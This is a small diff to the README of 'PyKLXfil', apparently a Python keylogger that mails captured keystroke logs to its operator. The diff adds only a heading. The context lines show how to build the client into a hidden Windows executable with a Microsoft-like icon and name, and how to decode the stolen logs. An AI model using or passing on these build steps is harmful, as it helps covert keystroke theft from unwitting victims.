@@ -61,6 +61,7 @@ nano PyKLXfil-Client-mail.py
 ```sh
 pyinstaller --onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 -n mscc.exe PyKLXfil-Client-mail.py
 ```
+ ### Decoding the log files:
  * After recieving the encoded log files from the client or the mail-client, PyKLXfil-Decoder.py can be used to decode them:
 ```sh
 python3 PyKLXfil-Decoder.py xxxx.log
